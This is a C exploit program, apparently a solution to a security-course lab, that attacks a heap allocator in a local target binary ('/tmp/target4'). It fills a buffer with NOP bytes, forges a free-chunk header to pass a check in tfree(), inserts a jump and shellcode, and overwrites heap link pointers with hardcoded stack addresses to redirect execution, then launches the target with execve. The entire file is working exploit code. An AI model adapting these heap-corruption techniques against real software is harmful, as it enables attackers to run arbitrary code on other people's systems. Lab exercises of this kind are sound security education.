#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define q_ptr 0x08059950
#define p_ptr 0x08059878

int main(void)
{
  char *args[3];
  char *env[1];
  char buffer[1024];

  int i;
  for (i = 0; i < 1024; i++)
  {
    buffer[i] = 0x90;
  }

  // Add Fake Right to pass if statement in tfree()
  *((int *)(buffer + 4)) = 0xbfffffff; // Random number ending with FREEBIT SET

  // Shellcode and Jump
  strncpy(buffer + 50, shellcode, 45);
  char *jumpcode = "\xeb\x0c";
  strncpy(buffer, jumpcode, 2);

  // Set q.left and q.right
  *((int *)(buffer + (q_ptr - p_ptr - 8))) = 0xbffffbee;
  *((int *)(buffer + (q_ptr - p_ptr - 4))) = 0xbffffa7c;

  // Buffer Addr = 0xbffffbee (ARG in foo())
  // EIP = 0xbffffa7c (info frame in foo())

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}